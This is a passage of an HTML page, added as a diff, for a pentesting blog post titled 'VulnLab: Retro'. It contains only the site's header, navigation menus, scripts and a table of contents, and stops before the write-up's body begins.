@@ -1,0 +1,2205 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A blog about pentesting, security, and technology.">
+      
+      
+      
+        <link rel="canonical" href="https://tomfieber.github.io/blog/2024/07/04/vulnlab-retro.html">
+      
+      
+        <link rel="prev" href="../../06/29/vulnlab-baby.html">
+      
+      
+        <link rel="next" href="vulnlab-data.html">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>VulnLab: Retro - My Personal Site</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+        <script src="https://unpkg.com/iframe-worker/shim"></script>
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-HH4Y2D319L"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-HH4Y2D319L",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-HH4Y2D319L",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="VulnLab: Retro - My Personal Site" >
+      
+        <meta  property="og:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-retro.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://tomfieber.github.io/blog/2024/07/04/vulnlab-retro.html" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="VulnLab: Retro - My Personal Site" >
+      
+        <meta  name="twitter:description"  content="A blog about pentesting, security, and technology." >
+      
+        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/vulnlab-retro.png" >
+      
+    
+    
+   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#vulnlab-retro" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../index.html" title="My Personal Site" class="md-header__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Personal Site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              VulnLab: Retro
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../index.html" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About Me
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../references/index.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  References
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../index.html" title="My Personal Site" class="md-nav__button md-logo" aria-label="My Personal Site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Personal Site
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    About Me
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../archive/2024.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/tryhackme.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    tryhackme
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/vulnlab.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vulnlab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../category/writeups.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    writeups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    References
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            References
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cheatsheets
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Cheatsheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Injection attacks
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Injection attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/NoSQL/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    NoSQL
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            NoSQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/OS-command-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    OS command injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            OS command injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../references/cheatsheets/injection-attacks/SQL-injection/index.html" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    SQL injection
+    
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            SQL injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Methodologies
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Methodologies
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web apps
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Web apps
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../references/methodologies/web-apps/owasp-wstg.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP WSTG
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Service Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Service Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Foothold
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
